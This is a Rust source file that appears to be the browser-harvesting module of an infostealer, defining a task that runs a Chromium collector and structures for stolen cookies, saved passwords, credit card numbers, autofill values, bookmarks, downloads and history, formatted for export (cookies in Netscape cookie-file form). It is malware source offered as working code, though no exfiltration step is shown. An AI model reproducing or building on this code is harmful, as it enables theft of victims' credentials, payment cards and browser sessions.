#![no_std]

extern crate alloc;
mod chromium;

use crate::alloc::borrow::ToOwned;
use alloc::string::String;

use crate::chromium::ChromiumTask;
use alloc::vec;
use core::fmt::{Display, Formatter};
use tasks::Task;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask};

pub struct BrowsersTask {
    inner: CompositeTask
}

impl BrowsersTask {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                ChromiumTask::new()
            )
        }
    }
}

impl_composite_task_runner!(BrowsersTask, "Browsers");

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Cookie {
    pub host_key: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires_utc: i64
}

impl Display for Cookie {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f, 
           "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r", 
           self.host_key, self.path, self.expires_utc, self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Bookmark {
    pub name: String,
    pub url: String,
}

impl Display for Bookmark {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Url: {}",
            self.name, self.url
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct AutoFill {
    pub name: String,
    pub value: String,
    pub last_used: i64
}

impl Display for AutoFill {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Value: {}",
            self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct CreditCard {
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
    pub card_number: String,
    pub use_count: i64
}

impl Display for CreditCard {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Number: {}\n\
            Month/Year: {}/{}\n\
            Name: {}",
            self.card_number, self.expiration_month, self.expiration_year, self.name_on_card
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Download {
    pub saved_as: String,
    pub url: String
}

impl Display for Download {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Url: {}\n\
            Saved: {}",
            self.url, self.saved_as
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Password {
    pub origin: Option<String>,
    pub username: Option<String>,
    pub password: Option<String>
}

impl Display for Password {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Origin: {}\n\
            Username: {}\n\
            Password: {}",
            self.origin.as_deref().unwrap_or_default(),
            self.username.as_deref().unwrap_or_default(),
            self.password.as_deref().unwrap_or_default()
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct History {
    pub url: String,
    pub title: String,
    pub last_visit_time: i64
}

impl Display for History {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Title: {}\n\
            Url: {}\n",
            self.title,
            self.url,
        )
    }
}